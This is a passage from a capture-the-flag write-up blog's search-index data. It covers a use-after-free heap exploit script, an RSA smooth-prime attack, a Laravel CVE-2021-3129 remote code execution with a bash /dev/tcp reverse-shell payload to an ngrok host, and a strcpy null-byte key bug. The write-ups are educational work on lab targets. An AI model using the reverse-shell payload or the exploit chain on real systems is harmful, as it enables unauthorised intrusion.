0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x41414141\t0x0a424242\t0x00000000\t0x00000411 0x804c1b0:\t0x0a410a6c\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Do you know what has happened? The leaveMessage function has called malloc to allocate memory for our 8-byte message (AAAABBB plus a new line character). However, we previously deleted the allocation for the user structure using free. The behavior of free is not to clean up the memory space (that would be memset), but to mark the address of memory as free, so that it can be reused and overwritten later.\nThe vulnerability here is called Use After Free, which is self-explanatory. The address of memory is set to free, and the next call to malloc will allocate memory on that recently released address. Hence, we are overwriting 8 bytes from the original user structure, and therefore we can write the address we want at whatToDo (namely, the address of hahaexploitgobrrr).\nThis is a Python script using pwntools to obtain the flag:\n#!/usr/bin/env python3 from pwn import context, log, p32, remote, sys context.binary = 'vuln' def get_process(): if len(sys.argv) == 1: return context.binary.process() host, port = sys.argv[1], sys.argv[2] return remote(host, int(port)) def main(): p = get_process() p.sendlineafter(b'(e)xit\\n', b'S') p.recvuntil(b'OOP! Memory leak...') leak = int(p.recvline().decode().strip(), 16) p.sendlineafter(b'(e)xit\\n', b'M') p.sendlineafter(b'Enter your username: \\n', b'AAA') p.sendlineafter(b'(e)xit\\n', b'I') p.sendlineafter(b'(Y/N)?\\n', b'Y') p.sendlineafter(b'(e)xit\\n', b'L') p.sendlineafter(b'try anyways:\\n', p32(leak)) flag = p.recvline().decode().strip() p.close() log.success(f'Flag: {flag}') if __name__ == '__main__': main()  $ python3 solve.py mercury.picoctf.net 4593 [*] './vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to mercury.picoctf.net on port 4593: Done [*] Closed connection to mercury.picoctf.net port 4593 [+] Flag: picoCTF{d0ubl3_j30p4rdy_ba307b82}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/","section":"ctf","summary":"picoCTF 2021. 100 points. 32-bit binary. Heap exploitation. Use After Free","time":10,"title":"Unsubscriptions Are Free"},{"contents":"We are given the following source code and an instance to connect to:\n#!/usr/local/bin/python # # Polymero # # Imports fromCrypto.Util.numberimportisPrime, getPrime, inverse importhashlib, time, os # Local import FLAG=os.environ.get('FLAG').encode() classURSA: # Upgraded RSA (faster and with cheap key cycling) def__init__(self, pbit, lbit): p, q=self.prime_gen(pbit, lbit) self.public={'n': p*q, 'e': 0x10001} self.private={'p': p, 'q': q, 'f': (p-1)*(q-1), 'd': inverse(self.public['e'], (p-1)*(q-1))}  defprime_gen(self, pbit, lbit): # Smooth primes are FAST primes ~ ! whileTrue: qlst=[getPrime(lbit) for_inrange(pbit//lbit)] iflen(qlst) -len(set(qlst)) \u0026lt;=1: continue q=1 forqlinqlst: q*=ql Q=2*q+1 ifisPrime(Q): break whileTrue: plst=[getPrime(lbit) for_inrange(pbit//lbit)] iflen(plst) -len(set(plst)) \u0026lt;=1: continue p=1 forplinplst: p*=pl P=2*p+1 ifisPrime(P): break returnP, Q  defupdate_key(self): # Prime generation is expensive, so we'll just update d and e instead ^w^ self.private['d'] ^=int.from_bytes(hashlib.sha512((str(self.private['d']) +str(time.time())).encode()).digest(), 'big') self.private['d'] %=self.private['f'] self.public['e'] =inverse(self.private['d'], self.private['f'])  defencrypt(self, m_int): c_lst=[] whilem_int: c_lst+=[pow(m_int, self.public['e'], self.public['n'])] m_int//=self.public['n'] returnc_lst  defdecrypt(self, c_int): m_lst=[] whilec_int: m_lst+=[pow(c_int, self.private['d'], self.public['n'])] c_int//=self.public['n'] returnm_lst # Challenge setup print(\"\"\"| | ~ Welcome to URSA decryption services | Press enter to start key generation...\"\"\") input(\"|\") print(\"\"\"| | Please hold on while we generate your primes... |\\n|\"\"\")  oracle=URSA(256, 12) print(\"| ~ You are connected to an URSA-256-12 service,public key ::\") print(\"| id = {}\".format(hashlib.sha256(str(oracle.public['n']).encode()).hexdigest())) print(\"| e = {}\".format(oracle.public['e'])) print(\"|\\n| ~ Here is a free flag sample, enjoy ::\") foriinoracle.encrypt(int.from_bytes(FLAG, 'big')): print(\"| {}\".format(i)) MENU=\"\"\"| | ~ Menu (key updated after {}requests):: | [E]ncrypt | [D]ecrypt | [U]pdate key | [Q]uit |\"\"\" # Server loop CYCLE=0 whileTrue:  try: ifCYCLE%4: print(MENU.format(4-CYCLE)) choice=input(\"| \u0026gt; \") else: choice='u'  ifchoice.lower() =='e': msg=int(input(\"|\\n| \u0026gt; (int) \")) print(\"|\\n| ~ Encryption ::\") foriinoracle.encrypt(msg): print(\"| {}\".format(i)) elifchoice.lower() =='d': cip=int(input(\"|\\n| \u0026gt; (int) \")) print(\"|\\n| ~ Decryption ::\") foriinoracle.decrypt(cip): print(\"| {}\".format(i))  elifchoice.lower() =='u': oracle.update_key() print(\"|\\n| ~ Key updated succesfully ::\") print(\"| id = {}\".format(hashlib.sha256(str(oracle.public['n']).encode()).hexdigest())) print(\"| e = {}\".format(oracle.public['e'])) CYCLE=0  elifchoice.lower() =='q': print(\"|\\n| ~ Closing services...\\n|\") break  else: print(\"|\\n| ~ ERROR - Unknown command\") CYCLE+=1  exceptKeyboardInterrupt: print(\"\\n| ~ Closing services...\\n|\") break  except: print(\"|\\n| ~ Please do NOT abuse our services.\\n|\")  The server will generate two smooth prime numbers $p$ and $q$ (which means that $p - 1$ and $q - 1$ can be factorized easily in small factors). However, we are not provided with $n = p \\cdot q$, but with the SHA256 hash of $n$. Moreover, $e = 65537$, as usually. The flag is encrypted with RSA and the generated parameters.\nAfter that, we are given the opportunity to encrypt messages, decrypt ciphertexts or update the key.\nI noticed that there is something weird in the encrypt function:\ndefencrypt(self, m_int): c_lst=[] whilem_int: c_lst+=[pow(m_int, self.public['e'], self.public['n'])] m_int//=self.public['n'] returnc_lst  First af all, the message must be introduced as a decimal number. Furthermore, if the number is bigger than $n$, the function will perform more than one iteration of the while loop. Hence, we have a way to obtain $n$ by doing Binary Search:\nWe enter a number $x$. If $x \\geq n$, then the server will send more than one ciphertext; and if $x \u0026lt; n$, the server will reply with a single ciphertext. Therefore, we can set two limits (for example, $2^{256}$ and $2^{512}$) and branch the interval with Binary Search until we get $n$:\na, b=2**256, 2**512 whilea+1!=b: test_n=(a+b) //2 iflen(encrypt(r, test_n)) \u0026gt;1: b=test_n else: a=test_n n=aifa%2elseb print(n, a, b) asserthashlib.sha256(str(n).encode()).hexdigest() ==n_id_hex  To verify it, we can assert that the SHA256 hash of $n$ matches the one sent by the server at the beginning.\nOnce we have $n$, we can use Pollard\u0026rsquo;s p - 1 algorithm to factor it and then decrypt the flag as in most RSA challenges:\np, q=pollard_p_1(n) assertn==p*q phi_n=(p-1) *(q-1) d=pow(e, -1, phi_n) m=pow(flag_enc, d, n) print(bytes.fromhex(hex(m)[2:])) r.close()  So we can get the flag:\n$ python3 solve.py blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa [+] Opening connection to blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa on port 443: Done b'BlackHatMEA{96:19:07a094190d0777d995d4bb9f504a494631855c36}' [*] Closed connection to blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa port 443  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/ursa-minor/","section":"ctf","summary":"BlackHat MEA CTF 2022. RSA. Binary Search. Smooth primes","time":3,"title":"Ursa Minor"},{"contents":"We are provided with this webpage:\nEnumeration It shows a login form. Fortunately, we are given credentials in the challenge description: lxkid02:8rsNN9ohfLp69cVRFEgk4Qzs. Hence, we can use them to access:\nIt is a simple web page for some fake online store for cybercriminals.\nThe description of the challenge is quite long. The important things are the already used credentials and that it uses Laravel with debug mode activated.\nFinding a CVE There is a known exploit for Laravel when debug is on: CVE-2021-3129. There is a Python script that will trigger Remote Code Execution (RCE) on the server: laravel-exploits.\nThe only thing we must do is craft a PHAR file with the command we want to execute. First, we need to clone another repository to have phpggc:\n$ git clone https://github.com/ambionics/phpggc $ git clone https://github.com/ambionics/laravel-exploits  Laravel exploitation As a proof of concept, let’s try to execute the command id:\n$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system id $ python3 laravel-exploits/laravel-ignition-rce.py http://188.166.172.138:30742 ./exploit.phar + Log file: /www/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR ! + Phar deserialized -------------------------- uid=0(root) gid=0(root) groups=0(root) -------------------------- + Logs cleared  Alright, it worked. At this point, we could search the flag. But it will be better to gain a reverse shell on the system. For this purpose, we need to expose our listening port to the Internet with ngrok:\n$ ngrok tcp 4444 ngrok Session Status online Account Rocky (Plan: Free) Version 3.0.3 Region United States (us) Latency 126.434333ms Web Interface http://127.0.0.1:4040 Forwarding tcp://2.tcp.ngrok.io:16210 -\u0026gt; localhost:4444 Connections ttl opn rt1 rt5 p50 p90 1 0 0.00 0.00 373.56 373.56  Now we generate the PHAR file with the reverse shell command and send it:\n$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system \"bash -c 'bash -i \u0026gt;\u0026 /dev/tcp/2.tcp.ngrok.io/16210 0\u0026gt;\u00261'\" $ python3 laravel-exploits/laravel-ignition-rce.py http://188.166.172.138:30742 ./exploit.phar + Log file: /www/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR !  Flag And we receive the connection, so we can find the flag easily and capture it:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from ::1. Ncat: Connection from ::1:64517. bash: cannot set terminal process group (57): Inappropriate ioctl for device bash: no job control in this shell www@webuserlandcitymp-532274-8547f966cb-8w7ms:/www/public$ cd / cd / www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ export TERM=xterm www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ export SHELL=bash www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ stty rows 50 columns 158 www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ ls bin boot dev\tentrypoint.sh etc flagdUsTi home lib lib64 media\tmnt opt proc\troot run sbin srv sys tmp\tusr var www www@webuserlandcitymp-532274-8547f966cb-8w7ms:/$ cat /flag* HTB{c4nt_p0p_th3s3_ch41n5!}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/userland-city/","section":"ctf","summary":"PHP. Laravel exploit","time":3,"title":"Userland City"},{"contents":"We have a 64-bit binary called vault-breaker:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/'  If we execute it, we have two options:\n$ ./vault-breaker Current status: Unlocked🔓 ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▓▓▒▒▒▒▒▒░░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒░░▒▒░░████▓▓████░░▒▒▓▓▓▓▓▓▓▓▓▓░░▒▒░░ ░░░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓░░▓▓▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▓▓▓▓▓▓░░░░ ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒▓▓░░▓▓░░██▓▓▓▓▓▓▒▒▒▒██░░▓▓▓▓▒▒▒▒ ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░▓▓▒▒░░▒▒██░░██▒▒▒▒▒▒▒▒██▒▒▒▒██▓▓▒▒▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▒▒▓▓▒▒▓▓░░▒▒▓▓▒▒▒▒░░░░░░▒▒██░░██▒▒▒▒ ▒▒▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒░░░░▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▓▓▓▓▓▓▒▒ ░░▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▒▒▒▒▒▒▓▓░░▓▓░░░░░░░░▒▒▒▒██▒▒██▒▒ ▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▓▓▒▒░░▒▒▓▓░░░░░░░░░░▒▒▒▒▓▓▒▒██░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▓▓▒▒░░▒▒▓▓░░▒▒░░░░░░░░░░▓▓▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▒▒▒▒▒▒▓▓▒▒░░░░░░░░░░░░▒▒▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▒▒▒▒░░▓▓▒▒░░░░▒▒░░▒▒▒▒▓▓▒▒▓▓░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▓▓▒▒▓▓░░░░░░▒▒░░▒▒▓▓▓▓██▒▒ ░░▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓██▒▒░░▒▒▒▒▓▓▒▒░░░░▒▒▒▒▓▓▓▓▒▒░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓██▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░▓▓▒▒▒▒▒▒▓▓▒▒██▒▒▓▓▓▓░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▓▒▒██▒▒░░▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓░░░░ ░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓██▓▓████▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░░░░░░░ ░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓██▒▒▓▓▒▒▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [+] Random secure encryption key has been generated! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt;  If we use Ghidra to decompile the binary, we can see this main function:\nvoidmain() { longoption; setup(); banner(); key_gen(); fprintf(stdout, \"%s\\n[+] Random secure encryption key has been generated!\\n%s\", \u0026amp;DAT_00103142, \u0026amp;DAT_001012f8); fflush(stdout); while(true) { while(true) { printf(\u0026amp;DAT_00105160, \u0026amp;DAT_001012f8); option =read_num(); if(option !=1) break; new_key_gen(); } if(option !=2) break; secure_password(); } printf(\"%s\\n[-] Invalid option, exiting..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x45); }  The first option calls new_key_gen:\nvoidnew_key_gen() { intfd; FILE *__stream; longin_FS_OFFSET; ulong i; ulong length; charnew_key[40]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); i =0; length =0x22; __stream =fopen(\"/dev/urandom\", \"rb\"); if(__stream ==(FILE *) 0x0) { fprintf(stdout, \"\\n%sError opening /dev/urandom, exiting..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x15); } while(0x1f\u0026lt;length) { printf(\"\\n[*] Length of new password (0-%d): \", 31); length =read_num(); } memset(new_key, 0, 32); fd =fileno(__stream); read(fd, new_key, length); for(; i \u0026lt;length; i =i +1) { while(new_key[i] =='\\0') { fd =fileno(__stream); read(fd, new_key +i, 1); } } strcpy(random_key, new_key); fclose(__stream); printf(\"\\n%s[+] New key has been genereated successfully!\\n%s\", \u0026amp;DAT_00103142, \u0026amp;DAT_001012f8); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  This function has a bug that can be exploited. However, let\u0026rsquo;s see what the second option is for.\nThe second option calls secure_password:\nvoidsecure_password() { char*__buf; int__fd; ulong uVar1; size_tsVar2; longin_FS_OFFSET; characStack136[24]; undefined8 uStack112; inti; intlocal_64; char*local_60; undefined8 local_58; char*flag; FILE *fp; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); uStack112 =0x100c26; puts(\"\\x1b[1;34m\"); uStack112 =0x100c4c; printf(\u0026amp;DAT_00101308, \u0026amp;DAT_001012f8, \u0026amp;DAT_00101300, \u0026amp;DAT_001012f8); local_60 =\u0026amp;DAT_00101330; local_64 =0x17; local_58 =0x16; flag =acStack136; memset(acStack136, 0, 0x17); fp =fopen(\"flag.txt\", \"rb\"); __buf =flag; if(fp ==(FILE *) 0x0) { fprintf(stderr, \"\\n%s[-] Error opening flag.txt, contact an Administrator..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x15); } sVar2 =(size_t) local_64; __fd =fileno(fp); read(__fd, __buf, sVar2); fclose(fp); puts(local_60); fwrite(\"\\nMaster password for Vault: \", 1, 0x1c, stdout); i =0; while(true) { uVar1 =(ulong) i; sVar2 =strlen(flag); if(sVar2 \u0026lt;=uVar1) break; putchar((int) (char) (random_key[i] ^flag[i])); i =i +1; } puts(\"\\n\"); /* WARNING: Subroutine does not return */ exit(0x1b39); }  So we see that secure_password prints the flag encrypted with XOR and random_key.\nThe idea here is to abuse the bug in new_key_gen so that we overwrite random_key with all null bytes and the XOR cipher does nothing.\nThe problem is here:\nstrcpy(random_key, new_key);  The variable new_key has a given number of random values (from 0 to 31). The problem is that strcpy interprets new_key as a string, which is terminated by a null byte. And this null byte is copied into random_key.\nThe idea is to change the key starting with length 31 and go decreasing until 0. At this point, we will have a null random_key. Let\u0026rsquo;s check some steps with GDB:\n$ gdb -q vault-breaker Reading symbols from vault-breaker... (No debugging symbols found in vault-breaker) gef➤ disassemble new_key_gen Dump of assembler code for function new_key_gen: 0x0000000000001026 \u0026lt;+0\u0026gt;: push rbp ... 0x000000000000113d \u0026lt;+279\u0026gt;: cmp rax,QWORD PTR [rbp-0x50] 0x0000000000001141 \u0026lt;+283\u0026gt;: jb 0x1122 \u0026lt;new_key_gen+252\u0026gt; 0x0000000000001143 \u0026lt;+285\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001147 \u0026lt;+289\u0026gt;: mov rsi,rax 0x000000000000114a \u0026lt;+292\u0026gt;: lea rdi,[rip+0x204f0f] # 0x206060 \u0026lt;random_key\u0026gt; 0x0000000000001151 \u0026lt;+299\u0026gt;: call 0x9d0 \u0026lt;strcpy@plt\u0026gt; 0x0000000000001156 \u0026lt;+304\u0026gt;: mov rax,QWORD PTR [rbp-0x48] 0x000000000000115a \u0026lt;+308\u0026gt;: mov rdi,rax 0x000000000000115d \u0026lt;+311\u0026gt;: call 0x9f0 \u0026lt;fclose@plt\u0026gt; ... 0x0000000000001196 \u0026lt;+368\u0026gt;: add rsp,0x58 0x000000000000119a \u0026lt;+372\u0026gt;: pop rbx 0x000000000000119b \u0026lt;+373\u0026gt;: pop rbp 0x000000000000119c \u0026lt;+374\u0026gt;: ret End of assembler dump. gef➤ break *new_key_gen+299 Breakpoint 1 at 0x1151 gef➤ start Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Vault-breaker/vault-breaker Current status: Unlocked 🔓 ... [+] Random secure encryption key has been generated! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 31 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x3a13df13164d2f9b 0x3e52423f3cde51c2 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x42b8e9edf141c794 0x7d9940e7ae4bf33e gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x7fffffffe610: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ ni Program received signal SIGALRM, Alarm clock. 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ continue Continuing. [+] New key has been genereated successfully! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 30 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x7fffffffe610: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ ni 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ continue Continuing. [+] New key has been genereated successfully! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 29 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0xdec16a4ae0c0f28c 0x017ce2a4f208304d 0x7fffffffe610: 0x69b0acb732508fb3 0x0000009c2b0b449c gef➤ ni 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xdec16a4ae0c0f28c 0x017ce2a4f208304d 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x69b0acb732508fb3 0x0000009c2b0b449c  So with this process we fill random_key with null bytes. After that, we only need to request the encrypted flag. All of this can be automated with a Python script: solve.py.\n$ python3 solve.py 